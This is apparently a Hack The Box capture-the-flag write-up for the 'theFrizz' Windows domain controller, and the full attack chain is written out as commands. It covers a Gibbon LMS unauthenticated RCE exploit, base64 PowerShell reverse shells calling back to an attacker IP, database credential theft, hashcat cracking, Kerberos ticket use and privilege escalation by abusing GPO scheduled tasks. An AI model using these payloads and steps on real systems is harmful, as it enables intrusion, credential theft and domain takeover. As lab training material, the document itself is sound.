# theFrizz - HTB Writeup

**Target:** 10.129.232.168
**Domain:** frizz.htb
**Hostname:** FRIZZDC
**OS:** Windows Server (Domain Controller)
**Difficulty:** [TBD]

## Flags
- **User Flag:** 3c3af80b3aeefee66dcab6a12491bbab
- **Root Flag:** 35a0ed09f6d1e66eb5906ade78c5ae8a

---

## Reconnaissance

### Initial Scan

**Ping Check**
```bash
ping -c 3 10.129.232.168
```
- TTL 127 → Windows target (128 - 1 hop)

**Port Scan**
```bash
nmap -p- --min-rate=3000 -vvv 10.129.232.168 -Pn -oN nmap/theFrizzNmapOpenPorts.txt
```

**Open Ports Found:**
- 22/tcp - SSH (OpenSSH for Windows 9.5) ⚠️ **UNUSUAL FOR DC**
- 53/tcp - DNS (Simple DNS Plus)
- 80/tcp - HTTP (Apache 2.4.58 + PHP 8.2.12) ⚠️ **UNUSUAL FOR DC**
- 88/tcp - Kerberos
- 135/tcp - MSRPC
- 139/tcp - NetBIOS-SSN
- 445/tcp - SMB (**Signing REQUIRED**)
- 464/tcp - kpasswd5
- 636/tcp - LDAPS
- 3268/tcp - Global Catalog LDAP
- 3269/tcp - Global Catalog LDAPS
- Plus high ports: 49667, 49670, 63668, 63672, 63687

**Service/Version Scan**
```bash
ports=$(awk '/^[0-9]+\/tcp/ {print $1}' nmap/theFrizzNmapOpenPorts.txt | cut -d/ -f1 | paste -sd,)
nmap -p$ports -sSCV --min-rate=2000 10.129.232.168 -Pn -vvv -oN nmap/theFrizzNmapServicesVersions.txt
```

**Key Findings:**
- **Domain:** frizz.htb
- **Hostname:** FRIZZDC
- **HTTP Redirect:** http://frizzdc.frizz.htb/home/
- **Clock Skew:** +7 hours (important for Kerberos)
- **SMB Signing:** Enabled and REQUIRED (relay attacks blocked)

**Decision:** Apache + PHP on a DC is highly unusual → prioritize web application enumeration.

---

## Web Application Enumeration

### DNS Configuration
```bash
echo "10.129.232.168 frizz.htb frizzdc.frizz.htb" | sudo tee -a /etc/hosts
ping -c 1 frizzdc.frizz.htb  # Verify DNS resolution
```

### Initial Web Reconnaissance
```bash
curl -i http://frizzdc.frizz.htb
```
**Result:** 302 redirect to http://frizzdc.frizz.htb/home/

### Discovery: Gibbon-LMS
```bash
curl -i http://frizzdc.frizz.htb/Gibbon-LMS
```
**Result:** 301 redirect to /Gibbon-LMS/ (directory exists!)

**Gibbon-LMS = PHP-based Learning Management System**

### Version Identification
```bash
curl -L http://frizzdc.frizz.htb/Gibbon-LMS/ | tee logs/gibbon-homepage.html
curl -s http://frizzdc.frizz.htb/Gibbon-LMS/CHANGELOG.txt | head -20
```

**Identified Version:** Gibbon v25.0.00

**Flags/Notes:**
- Gibbon is open-source school management software
- Written in PHP → potential file upload, LFI, SQL injection vectors
- Version visible at bottom of login page and in CHANGELOG.txt

---

## Exploitation - Unauthenticated RCE

### CVE Research
```bash
searchsploit gibbon
```

**Finding:** Unauthenticated RCE vulnerability for Gibbon v25
**Exploit:** https://github.com/ulricvbs/gibbonlms-filewrite_rce

### Exploit Download
```bash
wget https://raw.githubusercontent.com/ulricvbs/gibbonlms-filewrite_rce/refs/heads/main/gibbonlms_cmd_shell.py
chmod +x gibbonlms_cmd_shell.py
```

### Initial Shell Access
```bash
./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
```

**Flags/Notes:**
- Exploit creates arbitrary file write → RCE
- **Pre-authentication exploit** (no credentials needed!)
- Provides basic command shell on target
- Running as web server user (likely `NT AUTHORITY\SYSTEM` or IIS APPPOOL user)
- Shell is functional but limited - upgrading to reverse shell for stability

---

## Shell Upgrade - Stable Reverse Shell

**Why upgrade?**
- Initial Gibbon command shell is basic and unstable
- Reverse shell provides better interactivity and stability
- Needed for complex operations (MySQL queries, file enumeration)

### Listener Setup (Attacker Machine)
```bash
rlwrap nc -lvnp 4444
```

**Flags/Notes:**
- `rlwrap` = adds readline support (arrow keys, command history)
- `-l` = listen mode
- `-v` = verbose output
- `-n` = no DNS resolution (faster)
- `-p 4444` = listen on port 4444

### Payload Generation

**Tool:** https://www.revshells.com

**Settings:**
- **IP:** 10.10.14.89 (attacker HTB VPN IP)
- **Port:** 4444
- **OS:** Windows
- **Payload Type:** PowerShell #3 (Base64)
- **Shell:** powershell
- **Encoding:** None

**Evidence:** Screenshot saved to `logs/windows reverse shell settings.png`

### Payload Execution
- created from https://www.revshells.com/
**From Gibbon command shell:**
```powershell
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOAA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

**Flags/Notes:**
- `-e` = execute base64-encoded command
- Base64 payload contains full reverse shell logic
- Creates TCP connection back to attacker on port 4444
- Provides interactive PowerShell prompt

**Result:** ✓ Stable reverse shell received on nc listener!

---

## Credential Harvesting

**All credential harvesting performed from stable reverse shell**

### Database Credentials - config.php

**Command** (from reverse shell)
```powershell
type C:\xampp\htdocs\Gibbon-LMS\config.php
```

**Credentials Found:**
- **Username:** MrGibbonsDB
- **Password:** MisterGibbs!Parrot!?1
- **Database:** MySQL (xampp installation)

**Flags/Notes:**
- XAMPP = Apache + MySQL + PHP + Perl for Windows
- Config file contains plaintext DB credentials
- Saved to `evidence/gibbonCreds.txt`

### MySQL Database Enumeration

**Command** (from reverse shell)
```bash
cd C:\xampp\mysql\bin
.\mysql.exe -u"MrGibbonsDB" -p'MisterGibbs!Parrot!?1' -e"use gibbon;select * from gibbonperson" 2>&1
```

**Flags/Notes:**
- Must navigate to MySQL bin directory first
- `-u` = username
- `-p` = password (no space between -p and password!)
- `-e` = execute SQL query
- `2>&1` = redirect errors to stdout
- Target table: `gibbonperson` (user accounts)
- **Note:** resetroot.bat shows root and pma passwords were deleted (found during enumeration)

**User Found:**
- **gibbonPersonID:** 0000000001
- **Name:** Fiona Frizzle (Ms. Frizzle)
- **Username:** f.frizzle
- **Email:** f.frizzle@frizz.htb
- **Password Hash:** 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03
- **Salt:** /aACFhikmNopqrRTVz2489
- **Role:** Primary admin (gibbonRoleIDPrimary: 001)

**Evidence Saved:**
- Full database output: `evidence/gibbonCredsDB.txt`
- Hash for cracking: `evidence/gibbonCredsFull.txt`

---

## Password Cracking

### Hash Identification
- create gibbonCredsFull.txt with hash and salt in this order 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489
```bash
hashcat gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force
```

**Flags/Notes:**
- Running without `-m` flag → hashcat auto-detects hash mode
- **Identified Mode:** 1420 (SHA256 + salt)
- Format: `hash:salt`

### Hash Cracking
```bash
hashcat -m 1420 gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force
```

**Flags/Notes:**
- `-m 1420` = SHA256($pass.$salt)
- Input file format: `067f746...b0c03:/aACFhikmNopqrRTVz2489`
- Wordlist: rockyou.txt (common passwords)
- `--force` = bypass warnings (usually for testing/CTF)

**Result:** ✓ **Password Cracked!**
- **User:** f.frizzle@frizz.htb
- **Password:** Jenni_Luvs_Magic23

---

## Kerberos Authentication & SSH Access

**Challenge:** SMB authentication with f.frizzle failed with `KRB_AP_ERR_SKEW` error.

**Root Cause:** Kerberos requires client and server clocks to be within 5 minutes. DC has +7 hour clock skew.

### Time Synchronization

**Command**
```bash
sudo date --set="$(date -d '+7 hours')"
```

**Flags/Notes:**
- Syncs Kali time to match DC's clock (+7 hours ahead)
- Critical for Kerberos authentication
- Must maintain this offset for duration of engagement

### Generate Kerberos Configuration

**Command**
```bash
nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' --generate-krb5-file ./krb5.conf
sudo cp ./krb5.conf /etc/krb5.conf
```

**Flags/Notes:**
- `--generate-krb5-file` = creates Kerberos configuration with realm/KDC settings
- Auto-populates FRIZZ.HTB realm and frizzDC.frizz.htb as KDC
- Must copy to `/etc/krb5.conf` for system-wide use

**Result:** ✓ Kerberos authentication now works (no more KRB_AP_ERR_SKEW)

### Obtain Ticket Granting Ticket (TGT)

**Command**
```bash
impacket-getTGT frizz.htb/f.frizzle:'Jenni_Luvs_Magic23' -dc-ip 10.129.71.156
```

**Flags/Notes:**
- `impacket-getTGT` = requests Kerberos TGT from KDC
- `-dc-ip` = Domain Controller IP address
- Saves ticket to `f.frizzle.ccache` file
- TGT valid for ~10 hours (renewable)

**Output:**
```
[*] Saving ticket in f.frizzle.ccache
```

### Export Ticket and Verify

**Command**
```bash
export KRB5CCNAME=~/Documents/obsidian/docs/CTF/HTB/theFrizz/f.frizzle.ccache
klist
```

**Flags/Notes:**
- `KRB5CCNAME` = environment variable pointing to Kerberos credential cache
- `klist` = lists current Kerberos tickets
- Shows `krbtgt/FRIZZ.HTB@FRIZZ.HTB` principal with valid start/end times

### SSH Authentication with Kerberos

**Command**
```bash
ssh -K f.frizzle@frizzDC.frizz.htb
```

**Flags/Notes:**
- `-K` = Enable GSSAPI (Kerberos) authentication
- No password prompt (authenticates with TGT)
- Connects to Windows OpenSSH server as domain user

**Result:** ✓ SSH login successful as `frizz\f.frizzle`

---

## User Flag Capture

**Command** (in SSH session as f.frizzle)
```powershell
whoami
Get-ChildItem -Path C:\Users\f.frizzle\Desktop
type C:\Users\f.frizzle\Desktop\user.txt
```

**Enumeration Output:**
```powershell
USER INFORMATION
----------------
User Name       SID
=============== ==============================================
frizz\f.frizzle S-1-5-21-2386970044-1145388522-2932701813-1103

GROUP INFORMATION
-----------------
Group Name                                 Type             SID
========================================== ================ ============
BUILTIN\Remote Management Users            Alias            S-1-5-32-580
BUILTIN\Users                              Alias            S-1-5-32-545
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

**User Flag:** `3c3af80b3aeefee66dcab6a12491bbab`

**Evidence Saved:** `evidence/user_flag.txt`

---

## Hidden File Enumeration - Recycle Bin

**Objective:** Search for deleted files that might contain credentials

### View Hidden Files and Directories

**Command**
```powershell
cd C:\
Get-ChildItem -Force
```

**Flags/Notes:**
- `Get-ChildItem` = PowerShell's `ls`/`dir` equivalent
- `-Force` = shows hidden and system files
- Mode column: `d--hs` = Directory, Hidden, System

**Key Finding:**
```
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs          10/29/2024  7:31 AM                $RECYCLE.BIN
```

### Enumerate Recycle Bin Contents

**Command**
```powershell
Get-ChildItem -Path C:\$RECYCLE.BIN -Recurse -Force
```

**Flags/Notes:**
- `C:\$RECYCLE.BIN` = system-wide recycle bin
- Each user has SID-based subfolder: `C:\$RECYCLE.BIN\{USER-SID}\`
- `$I` files = metadata (original path/filename)
- `$R` files = actual deleted content

**Found:**
```
Directory: C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          10/29/2024  7:31 AM            148 $IE2XMEG.7z
-a---          10/24/2024  9:16 PM       30416987 $RE2XMEG.7z
```

**Analysis:**
- `$IE2XMEG.7z` (148 bytes) = Metadata file
- `$RE2XMEG.7z` (30MB) = **Deleted 7z archive** (target file!)

### Read Metadata for Original Filename

**Command**
```powershell
Format-Hex 'C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\$IE2XMEG.7z'
```

**Flags/Notes:**
- `Format-Hex` = PowerShell hex viewer
- Reveals Unicode strings in metadata
- Shows original file path and name

**Original Filename Discovered:** `wapt-backup-sunday.7z`
**Original Path:** `C:\Users\f.frizzle\AppData\Local\Temp\wapt-backup-sunday.7z`

---

## File Transfer & Extraction

### Download Archive via SCP

**Command** (on Kali)
```bash
cd ~/Documents/obsidian/docs/CTF/HTB/theFrizz
scp 'f.frizzle@frizz.htb:C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' wapt-backup-sunday.7z
```

**Flags/Notes:**
- SCP path format for Windows: `C:/path` (forward slashes)
- Single quotes protect `$` in filename
- Kerberos authentication used automatically (from TGT)

**Result:** ✓ 30MB archive downloaded (00:01)

### Extract Archive

**Command**
```bash
cd ~/Documents/obsidian/docs/CTF/HTB/theFrizz
7z x wapt-backup-sunday.7z
```

**Flags/Notes:**
- `7z x` = extract with full directory structure
- No password required (unencrypted archive)

**Extracted Structure:**
```
wapt/
├── conf/
│   └── waptserver.ini
├── COPYING.txt
└── [other WAPT files]
```

### Analyze waptserver.ini

**Command**
```bash
cd wapt/conf
cat waptserver.ini
```

**Key Findings:**
```ini
[options]
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
```

### Decode Base64 Password

**Command**
```bash
echo 'IXN1QmNpZ0BNZWhUZWQhUgo=' | base64 -d
```

**Flags/Notes:**
- `=` padding at end = base64 indicator
- Common obfuscation technique in config files

**Result:** `!suBcig@MehTed!R`

**Hypothesis:** This password likely belongs to another domain user (m.schoolbus referenced in WAPT)

---

## Lateral Movement - m.schoolbus

### Test Credentials

**Command**
```bash
nxc smb frizzDC.frizz.htb -u m.schoolbus -p '!suBcig@MehTed!R' -k
```

**Result:** ✓ **Authentication successful!**

```
SMB         frizzDC.frizz.htb 445    frizzDC          [+] frizz.htb\m.schoolbus:!suBcig@MehTed!R
```

### SSH as m.schoolbus

**Command**
```bash
# Get new TGT for m.schoolbus
impacket-getTGT frizz.htb/m.schoolbus:'!suBcig@MehTed!R' -dc-ip 10.129.71.156
export KRB5CCNAME=~/Documents/obsidian/docs/CTF/HTB/theFrizz/m.schoolbus.ccache

# SSH with Kerberos
ssh -K m.schoolbus@frizzDC.frizz.htb
```

**Result:** ✓ SSH login successful as `frizz\m.schoolbus`

### Enumerate m.schoolbus Privileges

**Command** (in SSH session)
```powershell
whoami /all
```

**Critical Findings:**
```powershell
USER INFORMATION
----------------
User Name         SID
================= ==============================================
frizz\m.schoolbus S-1-5-21-2386970044-1145388522-2932701813-1106

GROUP INFORMATION
-----------------
Group Name                                   Type             SID
============================================ ================ ============
BUILTIN\Remote Management Users              Alias            S-1-5-32-580
frizz\Desktop Admins                         Group            S-1-5-...-1121
frizz\Group Policy Creator Owners            Group            S-1-5-...-520 ⚠️

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
```

**Key Observations:**
- **Group Policy Creator Owners** = Can create and modify GPOs
- **Desktop Admins** = Custom group (likely has special permissions)
- Need BloodHound to identify exact permissions

---

## BloodHound Enumeration

### Collect Domain Data

**Command** (on Kali)
```bash
cd ~/Documents/obsidian/docs/CTF/HTB/theFrizz/bloodhound
bloodhound-python -u f.frizzle -p 'Jenni_Luvs_Magic23' -d frizz.htb -ns 10.129.232.168 -c All --zip
```

**Flags/Notes:**
- `bloodhound-python` = Python BloodHound ingestor
- `-c All` = collect all data (users, groups, ACLs, sessions, trusts, etc.)
- `--zip` = output as single ZIP for import
- `-ns` = nameserver (DC IP)

**Result:** `20260121005619_bloodhound.zip` created

### Import and Analyze

1. Start neo4j and BloodHound
2. Import ZIP file
3. Run queries:
   - "Shortest Path to Domain Admins from Owned Principals"
   - Mark m.schoolbus as owned

### Critical BloodHound Findings

**m.schoolbus Permissions:**
- ✓ **WriteGPLink** over `DC=frizz,DC=htb` (domain root)
- ✓ **WriteGPLink** over Domain Controllers OU
- ✓ **Owns** relationship to multiple accounts
- ![[Pasted image 20260123235728.png]]

**Attack Path:**
```
m.schoolbus --[WriteGPLink]--> frizz.htb Domain
                          \
                           --> Domain Controllers OU
```

**What This Means:**
- Can link Group Policy Objects to domain root
- GPOs linked to domain apply to ALL computers (including DCs)
- Scheduled tasks in GPOs run as **NT AUTHORITY\SYSTEM**
- **Direct path to Domain Admin / SYSTEM!**

---

## Privilege Escalation - GPO Abuse

**Attack Method:** Create malicious GPO with scheduled task → Link to domain → Task executes as SYSTEM on DC

### Step 1: Download SharpGPOAbuse

**Command** (on Kali)
```bash
cd ~/Documents/obsidian/docs/CTF/HTB/theFrizz
wget https://github.com/FSecureLABS/SharpGPOAbuse/releases/download/1.0/SharpGPOAbuse.exe
```

**Flags/Notes:**
- SharpGPOAbuse = .NET tool for GPO privilege escalation
- Purpose-built for WriteGPLink abuse
- Can add scheduled tasks to GPOs

### Step 2: Transfer to Windows Target

**On Kali:**
```bash
python3 -m http.server 6969
```

**In SSH session (as m.schoolbus):**
```powershell
cd C:\Users\M.SchoolBus\Desktop
Invoke-WebRequest -Uri "http://10.10.14.89:6969/SharpGPOAbuse.exe" -OutFile "SharpGPOAbuse.exe"
```

**Flags/Notes:**
- `Invoke-WebRequest` = PowerShell's wget/curl
- `-Uri` = source URL (Kali HTTP server)
- `-OutFile` = destination filename

**Alternative Transfer Methods:**
- SCP: Path syntax issues with Windows
- Base64: Too large (10k+ lines for binary)
- SMB: Requires admin access to C$

**Result:** ✓ SharpGPOAbuse.exe on target Desktop

### Step 3: Create Malicious GPO

**Reverse Shell Payload Generation:**
- Tool: https://www.revshells.com
- IP: 10.10.14.89 (Kali VPN IP)
- Port: 6969
- Payload Type: PowerShell #3 (Base64)
- Screenshot saved: `logs/revshell-gpo-settings.png`

**Setup Listener** (on Kali):
```bash
rlwrap nc -lnvp 6969
```

**Flags/Notes:**
- `rlwrap` = readline wrapper (arrow keys, history)
- `-l` = listen mode
- `-v` = verbose
- `-n` = no DNS lookups
- `-p 6969` = listen on port 6969

### Step 4: Manual GPO Creation and Linking

**In SSH session (as m.schoolbus):**
```powershell
# Create new GPO
New-GPO -name "theo-rev2"

# Link GPO to domain root (applies to all computers)
New-GPLink -Name "theo-rev2" -target "DC=frizz,DC=htb"
```

**Flags/Notes:**
- `New-GPO` = PowerShell cmdlet to create Group Policy Object
- `-name` = GPO name (arbitrary)
- `New-GPLink` = Links GPO to Organizational Unit
- `-target "DC=frizz,DC=htb"` = Domain root (applies to ALL computers including DCs)

**Output:**
```powershell
DisplayName      : theo-rev2
GpoId            : 589727cb-d6bc-4266-908f-5819c0e59bf7
Owner            : frizz\M.SchoolBus

GpoId       : 589727cb-d6bc-4266-908f-5819c0e59bf7
Enabled     : True
Target      : DC=frizz,DC=htb
Order       : 2
```

### Step 5: Inject Malicious Scheduled Task

**Command:**
```powershell
.\SharpGPOAbuse.exe --addcomputertask --GPOName "theo-rev2" --Author "theo" --TaskName "RevShell" --Command "powershell.exe" --Arguments "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOAA5ACIALAA2ADkANgA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

**Flags/Notes:**
- `--addcomputertask` = Adds immediate scheduled task to GPO (runs as SYSTEM)
- `--GPOName "theo-rev2"` = Target the GPO we created
- `--Author "theo"` = Task author (cosmetic, can be spoofed)
- `--TaskName "RevShell"` = Name of scheduled task
- `--Command "powershell.exe"` = Command to execute
- `--Arguments` = Base64-encoded PowerShell reverse shell payload
  - Connects to 10.10.14.89:6969
  - Provides interactive PowerShell prompt as SYSTEM

**Output:**
```
[+] Domain = frizz.htb
[+] Domain Controller = frizzdc.frizz.htb
[+] GUID of "theo-rev2" is: {589727CB-D6BC-4266-908F-5819C0E59BF7}
[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{589727CB...}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
```

### Step 6: Force GPO Update

**Command:**
```powershell
gpupdate /force
```

**Flags/Notes:**
- Forces immediate Group Policy refresh on local machine
- `/force` = reapplies all settings even if unchanged
- DC will also refresh GPO automatically (every 90-120 seconds)

**Output:**
```
Updating policy...
Computer Policy update has completed successfully.
User Policy update has completed successfully.
```

### Step 7: Receive Reverse Shell

**On Kali (nc listener):**
```
connect to [10.10.14.89] from (UNKNOWN) [10.129.71.156] 56583
PS C:\Windows\system32>
```

**Verify Privileges:**
```powershell
whoami
# Output: nt authority\system
```

**Result:** ✓ **SYSTEM shell received!**

---

## Root Flag Capture

**Command** (in reverse shell as SYSTEM)
```powershell
cd C:\Users\Administrator\Desktop
type root.txt
```

**Root Flag:** `35a0ed09f6d1e66eb5906ade78c5ae8a`

**Evidence Saved:** `evidence/root_flag.txt`

---

## Lessons Learned

### Initial Foothold
1. **Unusual Services = High Priority:** Apache + PHP + SSH on a DC is abnormal → investigate first
2. **Version Identification is Critical:** CHANGELOG.txt, composer.json, page footers often reveal exact versions
3. **Pre-auth Exploits are Gold:** Gibbon v25 RCE required no credentials → instant foothold
4. **Shell Stability Matters:** Basic command shells work but unstable → upgrade to reverse shell for complex operations

### Credential Discovery
5. **Config Files = Credential Goldmine:** config.php contained plaintext DB credentials
6. **Database Enumeration:** Application databases often store user credentials (even if hashed)
7. **Hash Format Matters:** SHA256 + salt requires specific hashcat mode (1420) and correct format (hash:salt)
8. **Email Format = Domain Username:** f.frizzle@frizz.htb likely maps to domain account

### Kerberos & Active Directory
9. **Kerberos Time Sync is Critical:** KRB_AP_ERR_SKEW = clock skew error; must sync time within 5 minutes of DC
10. **Clock Skew from nmap:** Initial nmap scan showed +7 hour offset → needed for Kerberos troubleshooting
11. **Kerberos Workflow:** Generate krb5.conf → getTGT → export KRB5CCNAME → authenticate
12. **SSH with GSSAPI:** Windows OpenSSH supports Kerberos auth (`ssh -K`) - no password prompt

### Windows Enumeration
13. **Hidden Files in Windows:** No naming convention (unlike Linux `.files`); use `Get-ChildItem -Force`
14. **Mode Column Attributes:** `d--hs` = Directory, Hidden, System (understand file attributes)
15. **Recycle Bin Forensics:** Always check `C:\$RECYCLE.BIN\{SID}\`
    - `$I` files = metadata (original path/filename)
    - `$R` files = actual deleted content
16. **Format-Hex for Metadata:** PowerShell's `Format-Hex` reveals Unicode strings in binary files

### Lateral Movement
17. **Base64 in Config Files:** `=` padding indicates base64; always decode suspicious strings
18. **WAPT Backup Contained Credentials:** Deleted backup archives may contain sensitive config files
19. **Password Reuse:** wapt_password worked for m.schoolbus domain account

### Privilege Escalation
20. **BloodHound is Essential:** Reveals non-obvious ACL-based attack paths (WriteGPLink, etc.)
21. **WriteGPLink Permission:** Can link GPOs to OUs → path to SYSTEM on DCs
22. **GPO Abuse Attack Path:**
    - Create GPO (New-GPO)
    - Link to domain root (New-GPLink -target "DC=domain,DC=tld")
    - Inject malicious scheduled task (SharpGPOAbuse)
    - Task runs as NT AUTHORITY\SYSTEM on all computers
23. **Manual GPO Creation:** PowerShell cmdlets (New-GPO, New-GPLink) + SharpGPOAbuse = flexible attack
24. **Scheduled Tasks in GPOs:** Run as SYSTEM, execute immediately (no reboot required)
25. **File Transfer Methods:** SCP syntax tricky on Windows; Python HTTP server + Invoke-WebRequest most reliable

### Tools & Techniques
26. **impacket-getTGT:** Essential for Kerberos ticket generation
27. **SharpGPOAbuse:** Purpose-built for GPO privilege escalation via WriteGPLink
28. **revshells.com:** Quick payload generation with proper encoding
29. **Group Policy Creator Owners:** Doesn't automatically grant WriteGPLink; BloodHound reveals true permissions

---

## Complete Attack Chain

```
Web Enumeration (Apache + PHP on DC) →
Gibbon-LMS v25.0.00 Discovery (CHANGELOG.txt) →
Unauthenticated RCE Exploit (gibbonlms_cmd_shell.py) →
Basic Command Shell → Reverse Shell Upgrade (PowerShell Base64) →
Stable Interactive Shell → config.php Enumeration →
Database Credentials (MrGibbonsDB) → MySQL gibbonperson Query →
f.frizzle Hash + Salt Extraction → Hashcat Mode 1420 Cracking →
Domain User Credentials (f.frizzle / Jenni_Luvs_Magic23) →
Kerberos Authentication (KRB_AP_ERR_SKEW → Time Sync +7 hours) →
krb5.conf Generation → impacket-getTGT (Ticket Granting Ticket) →
SSH with Kerberos (ssh -K f.frizzle@frizzDC.frizz.htb) →
User Flag Capture (C:\Users\f.frizzle\Desktop\user.txt) →
Hidden File Enumeration (Get-ChildItem -Force) →
Recycle Bin Discovery (C:\$RECYCLE.BIN\{SID}\) →
Format-Hex on $I file → Original filename: wapt-backup-sunday.7z →
SCP Transfer of $R file (30MB deleted archive) →
7z Extraction → waptserver.ini Discovery →
Base64 Decode wapt_password (IXN1QmNpZ0BNZWhUZWQhUgo=) →
m.schoolbus Credentials (!suBcig@MehTed!R) →
Lateral Movement via SSH (m.schoolbus@frizzDC.frizz.htb) →
whoami /all Enumeration → Group Policy Creator Owners membership →
BloodHound Collection (bloodhound-python) →
BloodHound Analysis → WriteGPLink Permission over DC=frizz,DC=htb →
SharpGPOAbuse.exe Download → Python HTTP Server Transfer →
Manual GPO Creation (New-GPO -name "theo-rev2") →
GPO Link to Domain Root (New-GPLink -target "DC=frizz,DC=htb") →
